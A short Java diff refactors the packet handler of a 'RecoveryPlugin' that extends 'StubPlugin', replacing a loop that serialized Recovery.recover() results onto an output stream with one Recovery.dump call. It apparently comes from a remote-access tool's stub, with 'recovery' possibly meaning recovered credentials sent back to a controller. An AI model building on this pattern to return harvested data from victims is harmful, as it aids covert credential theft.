@@ -33,17 +33,7 @@ public class RecoveryPlugin extends StubPlugin {
 	@Override
 	public void onPacket(short header) throws Exception {
 		if (header == HEADER) {
-			List<String[]> list = Recovery.recover();
-			
-			for (String[] a : list) {
-				dos.writeShort(HEADER);
-				dos.writeByte(a.length);
-				
-				for (String s : a) {
-					dos.writeShort(s.length());
-					dos.writeChars(s);
-				}
-			}
+			Recovery.dump(dos);
 		}
 	}
 	@Override
